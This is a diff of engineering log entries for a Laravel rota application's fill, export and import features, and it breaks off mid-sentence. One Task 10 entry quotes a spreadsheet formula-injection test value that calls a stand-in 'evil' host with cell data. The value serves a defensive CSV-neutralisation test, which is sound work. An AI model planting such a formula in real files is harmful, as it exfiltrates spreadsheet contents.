@@ -1108,6 +1108,743 @@ would otherwise have no home.
    **Counts.** `php artisan test` 1187 → **1193**, `npm test` 151 → **157**, `npm run test:e2e`
    **21** unchanged, `npm run build` green.
 
+**Task 7 (2026-08-10) — "three operations" is four action keys, and the task text says both.** The
+task's own opening names *"fill-down, fill-across and copy-period"* while Decision E says *"two
+fill-down actions, not one that guesses"* and Task 8 validates *"`op` in the **four** action keys"*.
+Four is the reconciled reading and what shipped: `RotaFill::FILL_DOWN_LEVEL`, `FILL_DOWN_COLUMN`,
+`FILL_ACROSS`, `COPY_PERIOD`, collected in `RotaFill::OPERATIONS` so Task 8's `RotaFillRequest`
+validates against the one list rather than restating it. Three *shapes*, four *actions*.
+
+**Task 7 (2026-08-10) — THE PLAN NEVER DEFINES "a cell carrying a split", and the narrow reading is
+a live data-loss bug.** Counting spans (`count > 1`) would leave a cell holding ONE span that starts
+on the 9th unprotected — which is Decision E's own worked example of deliberate work ("the four of
+them who join late start on the 9th"). What shipped: a cell carries a split when its span set is
+anything other than empty or exactly one span covering the period end to end (the degenerate split
+`MasterRotaAssignment`'s docblock names). `RotaFill::isSplit()`/`isWholePeriod()` are the one
+definition, used by both the target guard and Decision E's cross-period source test.
+
+**Task 7 (2026-08-10) — `UNCHANGED` has to be decided BEFORE the split guard, and the plan's outcome
+table does not say which wins.** A target already holding exactly the source's split loses nothing,
+so demanding a per-cell confirmation for it would be a tick for a no-op — and an operator taught to
+tick meaningless boxes is an operator who ticks the meaningful one.
+`test_an_identical_split_target_is_unchanged_and_needs_no_confirmation` pins it. The full precedence
+now lives in `outcomeFor()`'s docblock: source-level refusal (retired unit, split source) → stale
+target person → unchanged → split target → replace/assign, with source-level first because it kills
+every target and a preview where one row blames the target and the rest blame the source reads as a
+partial failure when it is a total one.
+
+**Task 7 (2026-08-10) — `SKIP_SPLIT_TARGET` keeps its proposal; every other skip drops it.** The
+plan says each target carries "the current span set and the proposed one". For the three skips
+nothing legitimate can be proposed, so `proposed` is `[]` — but `SKIP_SPLIT_TARGET` is the one skip
+the operator is asked to overrule, and they cannot choose between two span sets they can only see
+one of. Asserted in `test_a_target_carrying_a_split_is_skipped_unless_confirmed`.
+
+**Task 7 (2026-08-10) — the stale-person candidate set had to be scoped to the ACADEMIC YEAR, not
+the source period, and only the test found it.** The first shape unioned the active roster with
+people holding a span *in the source period*, which reads correct and is not:
+`RotaGrid`'s row set unions anybody holding a span anywhere in the **year**, so a person who left in
+April still has a row in every column — including the ones where their cell is empty.
+`test_an_inactive_target_person_is_skipped` went red with *"No target planned for person 2 in period
+1"*: the departed person simply was not in the plan, so a fill-down-column preview was one row
+shorter than the column with nothing to say why. Fixed by widening the union's subquery to the year,
+at **zero** extra queries — both halves are model query builders passed to `whereIn` (`Period::forYear()`
+and `MasterRotaAssignment::query()`), deliberately not `->from('master_rota_assignments')`, because a
+raw table name would be the first mention of that table outside its one writer and
+`RotaWritersAreSingularTest`'s needles do not look for it.
+
+**Task 7 (2026-08-10) — an empty source cell, an unknown op and an empty target set are ERRORS, not
+empty plans.** The plan's return shape has an `errors` key and never says what fills it. A preview
+that silently renders "0 cells" is indistinguishable from one whose operator picked the wrong cell.
+Five errors ship: unknown operation, source period gone, empty source cell, copy-period with no or
+same or out-of-year target, and a catch-all "nothing for this fill to do" when the target set comes
+out empty for any other reason. `errors` non-empty always means `targets` empty.
+
+**Task 7 (2026-08-10) — `plan()` strips a `context` key that `analyse()` returns.** `analyse()`
+resolves the `Person`/`Period` MODELS it validated against, which Task 8's `apply()` dispatches to
+`RotaAssignment::set()`/`split()` without a second round of queries; `plan()` unsets them, because
+Eloquent models in a props payload is how a contact field reaches a page nobody meant to put it on
+(Decision C, finding 3). Task 8 needs no change to `analyse()` for this.
+
+**Task 7 (2026-08-10) — the red was watched twice, and the second time was the point.** The class was
+created as a stub returning an empty plan FIRST, so the 14 behavioural cases failed on wrong
+outcomes and missing targets rather than on "class not found" — the standing rules name a missing
+class as explicitly not the reason a test should be red. The two remaining cases passed against that
+stub **vacuously** (two empty plans are identical; a plan that resolves nothing issues no query), so
+each gained a non-vacuity assertion — five targets, and a non-empty target list — and both were then
+watched red. Finally, `test_plan_writes_nothing` was proved falsifiable by planting the exact defect
+it exists to catch (a `RotaAssignment::set()` inside `analyse()`'s target loop, i.e. Task 8's
+`apply()` leaking into `plan()`) and watching it go red before reverting.
+
+**Task 7 (2026-08-10) — that probe also showed the guard's own failure message was 126 KB.** The
+first version compared the whole serialised assignment row set with `assertSame`, so a real failure
+dumped 390 rows into the runner — the "never dump a failing suite into context" rule broken by the
+test meant to help. Now: row count first (the readable half), then `md5()` of the row set (which
+still catches a same-count swap that a count alone would pass).
+
+**Task 7 (2026-08-10) — measured query budgets, and they are constant in the number of targets.**
+Read from a deliberately unreachable `assertLessThan(1, …)` on a 40-person, 13-period fixture, then
+restored: `fill_down_level` **6**, `fill_down_column` **4**, `fill_across` **5**, `copy_period` **5**.
+`fill_down_level`'s extra two are `Person::levelSpansBetween()` and its eager `level` load; the two
+cross-period ops' extra one is the academic year's period list, which fill-down does not need.
+
+**Task 7 (2026-08-10) — counts.** `php artisan test` 1193 → **1209** (sixteen in the new
+`RotaFillPlanTest`). `npm test` **157** and `npm run test:e2e` **21** unchanged — this task adds no
+client file and no route. `npm run build` green.
+
+**Task 8 (2026-08-10) — the task text never says what pins the commit to the previewed plan, and
+without one, "re-derives the plan" is only half of `RosterImport`'s discipline.** Decision F says
+`apply()` re-runs `analyse()` inside its transaction and never trusts the client — which it does,
+and which is necessary. But `RosterImport` does a second thing the task text does not transpose: its
+commit refuses outright unless the sha256 of the bytes it is about to import equals the digest its
+own preview returned. Re-derivation alone gives an operator who confirmed *"replace 40 cells"* an
+apply of whatever the grid says by the time their click lands — silently, and with a `back()` that
+looks identical to the one they expected. That is the same defect class the digest exists to close.
+
+What shipped: **`RotaFill::plan()` returns a `digest`, `RotaFillRequest` requires it on the confirm
+route, and `apply()` takes it as a fourth argument.** A fill has no file, so the digest is taken
+over the plan's own STATE PROJECTION — the operation, the source cell, and per target the cell's
+identity, what it CURRENTLY holds and what would be WRITTEN over it — computed by one
+`RotaFill::digest()` used by both entry points, never re-typed. `outcome`/`reason` and the
+confirmations are deliberately OUT of it, because they are a pure function of that state *and* the
+operator's own answers: including them would invalidate the pin on every tick of a confirm box,
+force a re-preview round trip per tick, and make Task 9's master "overwrite all splits" control
+impossible to build. The pin catches the WORLD moving, not the operator deciding.
+`test_confirming_a_cell_does_not_invalidate_the_digest` asserts exactly that pair (the confirmation
+changes the summary; the digest does not). **Task 9's request body therefore carries a fifth field:
+`{op, source_person_id, source_period_id, target_period_id?, confirmations, digest}`** — the task
+text's list omits it.
+
+**Task 8 (2026-08-10) — consequently, the plan's own test 1 describes the wrong behaviour.** It asks
+for *"a request whose claimed plan says 'replace 40 cells' while the database has since changed;
+assert the applied set matches a fresh analysis, not the claim"*. Taken literally that is the
+silent-divergence defect above: the fill would apply a set the operator never saw. Under the pin a
+changed grid is a **refusal** — 422 on `digest`, zero rows written
+(`test_a_fill_is_refused_when_the_grid_changed_under_the_operator`). The "does not trust the
+request" half is kept as its own test
+(`test_the_spans_come_from_the_source_cell_and_never_from_the_request`, which posts a forged
+`unit_id`, a forged `spans` array and a forged `targets` array and asserts the written row carries
+the SOURCE cell's unit).
+
+**Task 8 (2026-08-10) — the refusal is a typed exception, not a string in `errors`.** The controller
+has to tell "the rota moved" apart from every other refusal to put the message on the right field,
+and picking an HTTP field by matching an error message's text is the drift this codebase keeps
+removing. `App\Support\Rota\StaleFillPlanException` (new file, not in the task's "Files touched") is
+thrown from INSIDE `apply()`'s transaction, so the refusal rolls back rather than resting on a
+`return` that is only safe while nothing above it writes.
+
+**Task 8 (2026-08-10) — the audit detail gains two keys the plan's format omits, and one of them is
+a real gap.** Decision F specifies
+`op=…;source_person=…;source_period=…;targets=…;assigned=…;replaced=…;skipped=…`. Two problems.
+(1) **`target_period` is missing**, so a `copy_period` row records that a column was overwritten but
+not *onto which* — the single most important fact about that operation, and unrecoverable
+afterwards. (2) `unchanged` is missing, so `targets` does not equal the sum of the outcome counts
+and a reader has no way to tell a short row from a lost one. Shipped as
+`op=<op>;source_person=<id|none>;source_period=<id>;target_period=<id|none>;targets=<n>;assigned=<n>;replaced=<n>;unchanged=<n>;skipped=<n>`
+— always the same keys, `none` where the operation has no such id, still ids and counts only.
+
+**Task 8 (2026-08-10) — "assert no `rota_fill` row after a forced failure" cannot prove finding 8,
+and the test that replaced it found the harness in the way.** An audit row written INSIDE the
+transaction would roll back too, so the plan's test 5 passes either way. What distinguishes them is
+the transaction DEPTH at the moment the row is appended, asserted in
+`test_the_audit_row_is_appended_outside_the_fills_transaction` via an `AuditLog::created` listener.
+First written as `assertSame([1], …)` and red at `2` — **`RefreshDatabase` wraps every test in a
+transaction of its own**, so the ambient depth is 1 and `AuditLog::record()`'s own makes 2. Now
+asserted as `ambient + 1`, measured in the test rather than hard-coded, and proved falsifiable by
+wrapping the controller's `AuditLog::record()` call in a `DB::transaction()` and watching it read
+`3`.
+
+**Task 8 (2026-08-10) — three guards were proved falsifiable by planting the defect, not by
+reading them.**
+1. `RotaWritersAreSingularTest` — a `MasterRotaAssignment::create(` planted in `RotaFill::apply()`'s
+   dispatch loop went red naming the file and the needle. It would catch a second writer here.
+2. `test_a_failure_part_way_through_rolls_the_whole_fill_back` — replacing `apply()`'s
+   `DB::transaction(fn …)` with a plain immediately-invoked closure went red with **7 rows where
+   there had been 6**, i.e. a genuine partial apply. The atomicity claim is measured, not asserted.
+3. `AuditAnomaliesTest::test_a_rota_fill_is_reported_as_a_single_occurrence` was written and watched
+   red (*"the expected OpsAlertMail was not sent"*) BEFORE `rota_fill` joined the watch list — so
+   the list is proved to fire on it, not merely to contain the string.
+
+**Task 8 (2026-08-10) — the acting administrator is a row in their own fill, and two tests had to
+say so.** `User::factory()` links every account to a `people` row (P0c), and that person is active,
+so a `fill_down_column` run by an administrator targets their own roster row as well. Correct
+behaviour — a fill-down fills the column it is looking at — but it made a 40-peer fixture produce
+**41** targets and a 2-peer one produce 3. Both counts are now stated in the tests with the reason,
+rather than computed from the plan, because a test that derives its expected count from the thing
+under test asserts nothing about the count.
+
+**Task 8 (2026-08-10) — `AuditAnomaliesTest::test_per_cell_rota_editing_is_not_watched` passed on
+its first run,** and is recorded as such per the standing rules. It is a regression guard on
+Decision H (fifty `rota_assign` rows plus one each of `rota_split`/`rota_clear`/`vacation_book`/
+`vacation_cancel` raise no alert), not a red-first test: those five actions were already absent from
+the watch list. It would go red the moment anybody adds one of them.
+
+**Task 8 (2026-08-10) — `RotaFill`'s class docblock opened with "THIS CLASS WRITES NOTHING", which
+this task makes false.** Rewritten to "TWO ENTRY POINTS, ONE ANALYSIS", keeping the writes-nothing
+claim where it is still true and testable (`plan()`, `test_plan_writes_nothing`). Left as-is it
+would have been the most confidently wrong sentence in the file.
+
+**Task 8 (2026-08-10) — counts.** `php artisan test` 1209 → **1226** (fifteen in the new
+`RotaFillCommitTest`, two in `AuditAnomaliesTest`). `npm test` **157** and `npm run test:e2e` **21**
+unchanged — this task adds no client file. `npm run build` green.
+
+**Task 9 (2026-08-10) — THE PLAN COULD NOT REACH A SCREEN AT ALL, and the task's file list is why
+it would have shipped that way.** Task 8's controller flashes the plan with
+`back()->with('rota_fill_preview', …)`; Inertia does not forward session flash to a page on its own,
+and every other one-shot channel in this app is enumerated in `HandleInertiaRequests::share()`'s
+`flash` array (`roster_preview`, `promotion_preview`, `bulk_report`, …) precisely because a session
+key no `share()` names is invisible to every screen. Neither Task 8's "Files touched" nor Task 9's
+mentions that file, so as written this task builds a panel bound to a prop that is permanently
+`undefined` — and `npm run build`, `npm test` and `php artisan test` would all have stayed green,
+because a Vitest mount supplies its own `usePage()` props and no PHP test renders Vue. Caught by
+writing the test first: `RotaFillCommitTest::test_the_preview_and_the_result_reach_the_screen_as_
+shared_flash_props` went red with *"Property [flash.rota_fill_preview.targets] does not exist"*.
+Asserted through a REAL second request rather than by reading `session()`, because "the controller
+flashed it" and "a page can see it" are different claims and only the second one is the feature.
+`app/Http/Middleware/HandleInertiaRequests.php` therefore joins this task's file list.
+
+**Task 9 (2026-08-10) — the task lists only Vitest, and two of this task's claims are server-side
+facts.** Both new PHP cases live in `tests/Feature/Rota/RotaFillCommitTest.php` (the preview route's
+own test file) rather than a new one: the flash-plumbing case above, and the preview request's query
+budget. A budget measured on `RotaFill::plan()` alone (Task 7: 4–6) does not bound what an
+operator's click costs, and the growth it exists to catch — a per-target lookup added to the
+CONTROLLER or the REQUEST rather than to `RotaFill` — is invisible to Task 7's bound by
+construction.
+
+**Task 9 (2026-08-10) — measured preview budget: 7 warm, 10 cold; pinned at 12 — and the BOUND is
+the weaker half.** Read from a deliberately unreachable `assertLessThan(1, …)` and restored. The
+three-query gap between the first request in a process and the second is session and
+capability-catalogue warmup, the same effect Task 3's amendment measured as a 16→11 drop on `/rota`,
+so the test discards a warm-up request before measuring. The assertion that actually guards the N+1
+is the **equality**: the same operation is measured against a 4-target column and a 44-target one
+and the two counts must be identical. Proved falsifiable by planting a per-target
+`Person::query()->find()` in `MasterRotaController::fillPreview()` — **11 vs 51**, where the bound
+of 12 alone would have passed the small fixture and only failed the large one for a reason the
+message would have mis-stated.
+
+**Task 9 (2026-08-10) — `withHeaders()` persists for the REST OF THE TEST, and that made an Inertia
+GET a 409.** `MakesHttpRequests::withHeaders()` sets the case's default headers, not one request's.
+So the `X-Inertia: true` needed on the preview POST was still attached to the `GET /admin/rota` that
+follows it, and Laravel answered a version mismatch (409) rather than rendering the page — a failure
+that looks exactly like a broken route. `flushHeaders()` before each GET, with the reason at the
+call site. Worth recording because the two rota test files that came before this one never mix the
+two request shapes in one test, so nothing in the tree demonstrated the trap.
+
+**Task 9 (2026-08-10) — Vue Test Utils SILENTLY SKIPS a click on a disabled element, and the
+four-actions case measured two posts for four clicks because of it.** The panel disables its
+controls for the duration of a visit (`fillProcessing`), which is correct — a double-click on
+"Apply this fill" must not post twice. But `trigger()` returns early when `element.disabled` is
+true, and the mocked router never calls `onFinish`, so the flag stayed set. Worse, the count was
+**2**, not 1: `trigger()` awaits a tick on its way out, so every other click landed on a
+freshly-re-enabled button. The fix is in the test — play `onFinish` back, as Inertia always does,
+and let the tick through — not in the component: a screen that stopped disabling itself to make a
+test pass would be a screen that can double-apply a fill.
+
+**Task 9 (2026-08-10) — the master-tick case COULD NOT DETECT the defect it is named after, in its
+first shape.** It asserted the two boxes became checked, then unticked one and asserted the request
+body carried `{'11:101': true}`. A master control that replaced the per-cell set with a single flag
+would pass all of that, because with one box unticked it is no longer "all" and any implementation
+falls back to the explicit set. **Proved** by planting
+`confirmations: fillAllSplitsConfirmed.value ? { all: true } : fillConfirmedSet()` and watching the
+file stay green. Now the body is asserted while ALL boxes are ticked — the state a flag would
+collapse — and the untick-one half is kept beside it as the thing a flag cannot do at all. Red
+against the planted flag (*"expected { all: true } to deeply equal { '9:101': true, '11:101':
+true }"*), green after restore.
+
+**Task 9 (2026-08-10) — the preview is gated on the SERVER's own echo, not on a client-side key.**
+`RosterImport.vue` invalidates its preview with a `previewedKey`/`currentKey` pair over the file and
+mapping, because a file is client-side state the server never sees again. A fill has no such state:
+`RotaFill::plan()` echoes the `op` and the `source` cell it planned against, so `fillPlan` renders
+only when that echo matches the action and cell currently selected. That closes a case a client key
+would not: a plan flashed by a DIFFERENT screen action, or one surviving into a render where the
+operator has since picked another operation, is simply not this plan and is never drawn under this
+one's heading.
+
+**Task 9 (2026-08-10) — ticking a box does NOT re-preview, and the screen says so rather than
+pretending the table is current.** Task 8 kept the confirmations out of the digest exactly so a
+per-tick round trip is unnecessary and a master control is buildable; the consequence the task text
+does not draw is that the OUTCOMES on screen were computed against the ticks the preview ran with,
+so a ticked `SKIP_SPLIT_TARGET` row still reads "skipped" until the next preview. Three things
+follow, all shipped: the four counts stay the server's (the plan's instruction — the component
+computes none of them), a separate line names how many boxes the OPERATOR has ticked since, and a
+"Preview again" control sits beside "Apply this fill". Confirming without re-previewing remains
+correct — `apply()` re-derives with the same confirmations — and the notice says that too, rather
+than blocking a safe action.
+
+**Task 9 (2026-08-10) — the task says "a panel below the grid" and never says how it OPENS.** A
+"Fill…" affordance now sits in every non-stale cell's action row beside Split…/On leave…/Clear, on
+both the mobile cards and the desktop table, and it is off a stale row for the same reason Split is:
+`RotaFillRequest` applies the strict active predicate to `source_person_id`, so a fill from a
+departed person's cell could only ever 422. Copy-period also needed a control the task text does not
+mention — it copies onto ANOTHER block, so the panel offers a `<select>` of the year's other
+periods, and the button is disabled until one is chosen. The three cell-sourced actions are disabled
+on an empty source cell, which the server would otherwise answer with *"that cell is empty"* after
+a round trip.
+
+**Task 9 (2026-08-10) — every claim worth making was proved falsifiable by planting its defect.**
+Four probes, each reverted: (1) the destroyed-span list replaced by `{{ current.length }} span(s)` →
+*"expected '2 span(s)' to contain 'PICU'"*, which is the legibility requirement failing exactly as
+intended; (2) the stale-digest handler calling `submitFill()` again instead of re-previewing → the
+"never retries" case red; (3) the master-tick flag above; (4) `fill_across` pointed at
+`/admin/rota/fill` → *"expected '/admin/rota/fill' to be '/admin/rota/fill/preview'"*. All eleven
+cases were watched red first against the un-implemented screen.
+
+**Task 9 (2026-08-10) — counts.** `php artisan test` 1226 → **1228** (two in `RotaFillCommitTest`).
+`npm test` 157 → **168** (eleven in the new `tests/js/MasterRotaFill.test.js`). `npm run test:e2e`
+**21** unchanged — re-measured rather than assumed, because this task adds a fourth button to every
+cell of `/admin/rota` and `master-rota.spec.js` locates its row by `hasText`; nothing collided.
+`npm run build` green.
+
+**Task 10 (2026-08-10) — the export is a support class, not two controller methods, and the reason
+is Task 11 rather than tidiness.** The task's "Files touched" lists only
+`MasterRotaController.php`. What shipped is `app/Support/Rota/RotaExport.php` holding
+`ASSIGNMENT_HEADERS`/`VACATION_HEADERS` and the two row builders, with the controller reduced to
+one private `export()` that both routes call. Three reasons, in order of weight: (1) the importer
+matches those header names case-insensitively (Decision H point 1), so the export and the import
+need ONE definition of the column list or they drift silently — a header renamed on the writing
+side and not the reading side produces a file that imports as "missing required header"; (2) every
+other rota computation in this codebase lives in `App\Support\Rota` (`RotaGrid`, `RotaFill`,
+`AvailabilitySummary`), so a hundred lines of query-and-row-building in a controller would be the
+one exception; (3) `peopleWithoutAShortName()` is a pure fold that belongs beside the thing it
+warns about.
+
+**Task 10 (2026-08-10) — the rows are an ARRAY, not the lazy generator the task text asks for, and
+the audit row is why.** *"`Csv::stream()` takes an iterable, so build rows lazily"* cannot be
+reconciled with test 6: a `StreamedResponse` does not run its callback until after the controller
+has returned, so a generator's row count is unknown at the moment `rota_export` is written. The
+alternatives were a second `COUNT(*)` — which can disagree with the file it claims to describe —
+or an audit row with no count, which is the one number the task specifies. A year's spans are
+bounded (sixty people x thirteen periods x a span or two), so the array is affordable and the count
+is the file's own.
+
+**Task 10 (2026-08-10) — THE STALE-PERSON DECISION: they are IN the file.** Decision D hides a
+departed person from the resident read view; this export deliberately does not. Their spans are
+exactly what blocks `PeriodController::destroy()`, so an administrator exporting the year to find
+out why it will not clear must see them — and the export sits behind `rota.manage`, the same
+capability as the EDITOR grid, which shows them for that same reason. Task 11 copes by answering
+such a row `SKIP_UNKNOWN_PERSON` with *"no longer on the active roster"* (Decision H point 3): the
+information is named on the way back in, never silently dropped on the way out. Both queries eager-
+load the person `withTrashed()`; proved necessary by removing it and watching
+`test_a_stale_person_who_still_holds_a_span_is_in_the_file` go red on the soft-deleted half —
+without it SoftDeletes' global scope nulls the relation rather than omitting the row, so the file
+would have carried the span with two BLANK name columns and no error anywhere.
+
+**Task 10 (2026-08-10) — the short-name warning counts people who would APPEAR IN THE FILE, not
+everybody in the year.** Decision G says the screen "names how many people in the year lack a short
+name". Counted literally over a `RotaGrid` row set that also includes every active person with
+nothing planned, the number does not match the number of broken lines in the file it is warning
+about — and a warning that fires on somebody who exports no rows at all is one an administrator
+learns to ignore. `RotaExport::peopleWithoutAShortName()` therefore requires at least one span or
+one vacation in the year. The export still RUNS with the blank handle, per the task text: dropping
+the person would lose rows from a file whose whole job is to describe what the rota holds.
+
+**Task 10 (2026-08-10) — a `?year=` with no periods is a 404, which the task text does not
+specify.** The alternative — a header-only file — makes a typo indistinguishable from a year whose
+rota was cleared, the same argument Task 7's amendment settled for a fill preview that silently
+renders "0 cells". `test_an_unknown_year_is_a_404` was the ONE case in this file green on its first
+run, and vacuously: before the routes existed every URL in it answered 404. It now asserts the
+known year is a 200 first, so deleting the routes fails it — the same non-vacuity fix Task 3's
+amendment records for the router assertion.
+
+**Task 10 (2026-08-10) — `ContactFieldsAreProjectedOnceTest` fired on this task's own DOCBLOCK.**
+`RotaExport`'s class comment explained that a future hand-built row carrying the phone attribute
+would fail the byte-level assertion — and quoted the arrow-and-field accessor form to say so. That
+guard's needle list is a plain substring scan with no allow-list, so the sentence describing the
+defect WAS the defect as far as the scan could tell: *"app/Support/Rota/RotaExport.php contains
+->phone"*, on an otherwise-green full run. This is finding 14's trap (docblock prose matching a
+needle) in the PHP contact scan rather than the client's date scan, and finding 14 only warns about
+the latter. Rewritten around the accessor shape; the guard was not touched.
+
+**Task 10 (2026-08-10) — every claim was proved falsifiable by planting its defect, and all five
+probes were reverted.** (1) The unit eager-load constrained to `active()` — i.e. reading codes the
+way `RotaGrid` does — → `test_a_retired_units_span_keeps_its_code` red with *"expected 'XCU', got
+''"*, which is the whole reason this class exists rather than a fold over the grid. (2) `withTrashed()`
+dropped, above. (3) An `email` column planted in `ASSIGNMENT_HEADERS` and its row → BOTH
+`test_the_export_carries_no_contact_column` and `test_a_person_is_identified_by_short_name_and_full_name`
+red, the first printing the leaked address in its own failure message. (4) Both export buttons
+pointed at the same file → the href case red (a screen offering two buttons to one file looks
+entirely correct otherwise). (5) The short-name warning's `v-if` forced false → the count case red.
+
+**Task 10 (2026-08-10) — the round trip is asserted at the FEATURE level, through
+`CsvRosterReader`, and it is what every content assertion in the file goes through.** Test 4 in the
+task text asserts the leading apostrophe in the raw bytes; that alone proves neutralisation but not
+the PAIRING, which is what `CsvInjectionTest` exists to assert at the primitive and what makes
+export → re-import lossless. `test_the_export_round_trips_through_the_reader_unchanged` writes the
+streamed bytes to a temp file, reads them back with the reader Task 11 will use, and asserts a
+formula-injection name (`=HYPERLINK("http://evil/?"&A1)`) and an Arabic name (`محمد العتيبي`) come
+back byte-identical from BOTH files. A short name beginning `=` is in the same fixture, so the
+handle the importer matches on is proved to survive the trip too.
+
+**Task 10 (2026-08-10) — `rota_export` is deliberately NOT on `AuditAnomalies`' watch list.** That
+list fires once per matching row in the window (finding 13), and an export is a routine
+administrative act; adding it would train an operator to ignore the channel that exists for
+`rota_fill`. The audit row is still written on every export, ids and counts only — and
+`test_a_resident_cannot_export` asserts a REFUSED export writes none.
+
+**Task 10 (2026-08-10) — counts.** `php artisan test` 1228 → **1241** (thirteen in the new
+`RotaExportTest`). `npm test` 168 → **173** (five in the new `tests/js/MasterRotaExport.test.js`;
+the plan lists no Vitest file for this task, but a prop nothing renders is exactly the defect
+Task 9's amendment records — the PHP side proves the count, only a mount proves an operator sees
+it). `npm run test:e2e` **21** unchanged, re-measured. `npm run build` green.
+
+**Task 11 (2026-08-10) — THE PIN LIVES IN `RotaImport`, NOT IN THE CONTROLLER, and the plan's own
+test list is what forces that.** `RosterImport` has no digest logic at all: `RosterImportController`
+computes the sha256 and throws the `ValidationException`. Transposed literally, Task 11's own test 4
+(*"a changed file 422s naming the mismatch"*) could not be written until Task 12 existed, so the
+task's central safety property would ship a task later than the code it protects. What shipped
+instead follows **Task 8's** precedent in this same slice: `RotaImport::digest()` is one definition
+used by both entry points, `preview()` returns it, and `commit()` takes the operator's claim as a
+fourth argument and refuses inside its own transaction. The refusal is `StaleImportFileException`
+(new file, in neither task's "Files touched") — the file sibling of `StaleFillPlanException`, for
+the reason Task 8 already wrote down: the controller has to tell this refusal apart from every other
+one to put the 422 on the right field, and choosing an HTTP field by matching an error message's
+text is the drift this codebase keeps removing. **Consequence for Task 12:** its controller is
+thinner than `RosterImportController`, not a mirror of it — it maps the exception to a 422 on `file`
+and writes no audit row of its own, because `commit()` writes `rota_import` itself, after its
+transaction (finding 8). A pin that a controller can forget to apply is not a pin.
+
+**Task 11 (2026-08-10) — `commit()` needs the BYTES, and that is a real seam the port does not
+cover.** `RosterReader` exposes `headers()` and `rows()` and nothing about the underlying file, by
+design (xlsx is one class away). The digest is over bytes, so `preview()`/`commit()` take
+`string $bytes` beside the reader, exactly as `RosterImportController::readerFromRequest()` already
+returns both from one `file_get_contents()`. Adding a `digest()` method to the PORT was rejected: it
+would put a second definition of the pin in every future reader implementation, and the one thing
+`RosterImport`'s controller proves about this is that a single definition is what makes it safe.
+
+**Task 11 (2026-08-10) — `UNCHANGED` is not in the plan's outcome list and the round trip cannot be
+written without it.** Decision H enumerates `CREATE`, `REPLACE`, `SKIP_UNKNOWN_*`, `SKIP_DUPLICATE`
+and `ERROR` — then the same task's test 9 asks that an exported year re-import with *"every outcome
+`UNCHANGED`/`SKIP_DUPLICATE`"*. Shipped with `UNCHANGED` as a first-class outcome, and it earns its
+place twice over: it is what makes a re-import cost **zero writes** rather than rewriting every row
+to its own value (a REPLACE of identical spans deletes and re-inserts, which is a different audit
+trail and a different set of row ids for the same rota), and it is the only outcome that can
+distinguish "this file matches the rota" from "this file overwrote the rota with itself".
+
+**Task 11 (2026-08-10) — the round trip's outcome set is FOUR answers, not two, and Task 10 is why.**
+Test 9 as written expects `UNCHANGED`/`SKIP_DUPLICATE`. A real export of a real year also contains a
+stale person's spans and a retired unit's code — Task 10 put both there deliberately, and its own
+amendment says so. So a faithful round trip answers `SKIP_UNKNOWN_PERSON` and `SKIP_UNKNOWN_UNIT`
+too. The assertion that actually carries the meaning is therefore not the outcome vocabulary but
+`create + replace + error === 0`, `applied === 0`, and an md5 fingerprint of the whole assignment and
+vacation row sets taken before and after the commit. All four are asserted;
+`test_an_exported_year_re_imports_as_a_no_op` names the seven expected outcomes exactly, sorted on
+both sides (the export's row order is a legibility property its own docblock disclaims, and pinning
+it would fail the day somebody improves it, for no defect).
+
+**Task 11 (2026-08-10) — a cell holding one good span and one on a retired unit is SKIPPED WHOLE,
+and that had to be decided rather than fallen into.** The cell is the unit of outcome and
+`split()` replaces the whole set, so applying the half that resolved would silently DELETE the half
+that did not — a data-loss shape identical to Task 7's "what is a split" finding. The full
+precedence now lives in `finaliseAssignmentCell()`'s docblock: person → period → file errors →
+unit → compare. Identity first because without it there is no cell to say anything about; the
+file's own errors before the unit because they name something to fix in the file rather than
+something about the department's configuration.
+
+**Task 11 (2026-08-10) — `Vacation::booted()` refuses OVERLAPPING leave, and the plan's outcome list
+has nowhere to put it.** `SKIP_DUPLICATE` covers an exact match; leave that overlaps existing leave
+without matching it would reach the model guard from inside the import transaction and abort the
+WHOLE file over a row the preview called clean. It is an `ERROR` on that row alone, detected against
+the same per-person list the duplicate check uses — so a duplicate/overlap **within the file** and
+one **against the database** are caught by one comparison rather than two rules that can disagree.
+`vacations-overlapping.csv` is the fixture; `test_leave_overlapping_other_leave_is_an_error_not_an_
+aborted_import` asserts the good row still lands.
+
+**Task 11 (2026-08-10) — three guard probes and three behaviour probes, every one reverted.**
+1. `MasterRotaAssignment::create(` planted in `commit()`'s dispatch loop → `RotaWritersAreSingularTest`
+   red naming the file and the needle. 2. `->save()` planted in the same place → the newly-extended
+   `RosterNeverMintsCredentialsTest` red on the bare persistence needle. 3. `User::create(` planted
+   there → the same guard red on the literal account-minting claim. 4. The `UNCHANGED` comparison
+   forced false → the round trip and the idempotence case both red with `replace` where `unchanged`
+   belonged, i.e. a re-import silently rewriting the year. 5. `CsvRosterReader::unNeutralise()`
+   short-circuited → `'=formula` came back as the handle and the round trip answered
+   **`skip_unknown_person`** for that person: the neutralise/un-neutralise mismatch failing in a
+   REAL column, silently, which is the exact defect the plan says only this test can catch.
+   6. `VacationBooking::snap()` made a no-op for `week` → the vacation case red on its own
+   NON-VACUITY half (*"the fixture week row is already aligned — this test would prove nothing"*).
+   **Probe 6 is the one worth reading:** the round trip stayed GREEN under a broken snap, because an
+   exported week booking is already week-aligned, so a no-op snap returns the same bounds. The round
+   trip is not the guard for the snap and never could be — only the not-aligned fixture is.
+
+**Task 11 (2026-08-10) — the red was watched behaviourally, per the standing rules.** The class was
+created as a stub returning an empty analysis FIRST, so 23 of 25 cases failed on wrong outcomes,
+missing cells and un-thrown refusals rather than on "class not found". The two that passed against
+the stub passed **vacuously** (an importer that writes nothing leaves an unmentioned cell alone; an
+empty analysis carries no Eloquent model either) and each gained a non-vacuity assertion — `applied
+=== 3`, and a three-outcome count — before being watched red.
+
+**Task 11 (2026-08-10) — two fixtures the plan's table does not list, both real failure shapes.**
+`assignments-blank-short-name.csv` (`people.short_name` is nullable — finding 5 — so an export can
+legitimately carry a blank handle, and `RotaExport`'s own test docblock already says Task 11 answers
+it `SKIP_UNKNOWN_PERSON`) and `assignments-bad-headers.csv` (the file-error path; the plan asks for
+`test_a_file_error_refuses_the_whole_import` and names no fixture that produces one).
+`assignments-retired-unit.csv` carries **two** rows rather than one, because a retired code and a
+non-existent code are two different operator problems and ship two different messages —
+`Unit::findByCode()` carrying no `active` scope is what makes telling them apart possible.
+
+**Task 11 (2026-08-10) — counts.** `php artisan test` 1241 → **1266** (twenty-five in the new
+`RotaImportTest`). `npm test` **173** and `npm run test:e2e` **21** unchanged — this task adds no
+client file and no route; e2e was re-measured rather than assumed. `npm run build` green.
+
+**Task 12 (2026-08-10) — the plan's own needle list would have failed the build on the three
+docblocks that state MR-04's absence, and the fix is a deliberate departure from finding 14.** The
